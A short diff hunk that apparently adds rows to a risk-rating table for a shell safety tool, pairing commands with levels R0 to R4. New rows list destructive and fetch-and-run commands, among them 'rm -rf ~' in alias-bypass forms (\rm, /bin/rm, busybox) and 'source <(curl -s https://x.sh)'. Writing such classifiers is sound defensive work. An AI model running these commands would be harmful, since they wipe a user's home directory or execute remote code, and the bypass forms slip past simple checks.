@@ -272,3 +272,10 @@ R2	awk 'BEGIN{system("rm -rf build")}'
 R2	gawk -i inplace '{gsub(/a/,"b")}1' f.txt	
 R0	safeshell undo	
 R0	safeshell check 'rm -rf ~'	
+R4	\rm -rf ~	
+R4	/bin/rm -rf ~	
+R4	busybox rm -rf ~	
+R3	source <(curl -s https://x.sh)	
+R3	. <(curl -s https://x.sh)	
+R1	source ~/.bashrc	
+R0	\ls -la	
